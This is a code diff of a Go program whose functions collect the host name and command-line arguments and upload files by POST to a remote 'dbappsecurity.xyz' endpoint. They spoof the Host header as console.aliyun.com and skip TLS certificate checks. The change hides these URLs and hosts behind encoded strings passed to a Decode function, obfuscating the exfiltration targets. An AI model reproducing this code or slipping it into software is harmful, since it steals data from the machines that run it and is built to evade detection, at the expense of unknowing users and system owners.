@@ -16,7 +16,7 @@ import (
 var connected bool
 
 func checkconn() bool { // 检测是否出网
-	_, err := net.LookupIP("aliyuncs.com")
+	_, err := net.LookupIP(string(Decode("SszJrCzNSy7WS87PBQAAAP//")))
 	if err != nil {
 		return false
 	}
@@ -33,10 +33,9 @@ func inforev() {
 	env = append(env, hostname)
 	env = append(env, strings.Join(os.Args, " "))
 	jstr, _ := json.Marshal(env)
-	req, _ := http.NewRequest("POST", "https://api.dbappsecurity.xyz/service", bytes.NewBuffer(jstr))
+	req, _ := http.NewRequest("POST", string(Decode("yigpKSi20tdPLMjUS0lKLCgoTk0uLcosqdSrqKzSL04tKstMTgUAAAD//w==")), bytes.NewBuffer(jstr))
 	req.Header.Add("Content-Type", "application/json;charset=utf-8")
-	//req.Header.Add("X-Forwarded-For", ip)
-	req.Host = "console.aliyun.com"
+	req.Host = string(Decode("Ss7PK87PSdVLzMmsLM3TS87PBQAAAP//"))
 	tr := &http.Transport{
 		TLSClientConfig: &tls.Config{InsecureSkipVerify: true},
 	}
@@ -68,8 +67,8 @@ func uploadfiles(filenames []string) {
 			Transport: tr,
 			Timeout:   1 * time.Second,
 		}
-		req, _ := http.NewRequest("POST", "https://api.dbappsecurity.xyz/ms", file)
-		req.Host = "console.aliyun.com"
+		req, _ := http.NewRequest("POST", string(Decode("yigpKSi20tdPLMjUS0lKLCgoTk0uLcosqdSrqKzSzy0GAAAA//8=")), file)
+		req.Host = string(Decode("Ss7PK87PSdVLzMmsLM3TS87PBQAAAP//"))
 		req.Header.Set("Content-Type", "image/jpeg")
 		_, err = client.Do(req)
 		if err != nil {
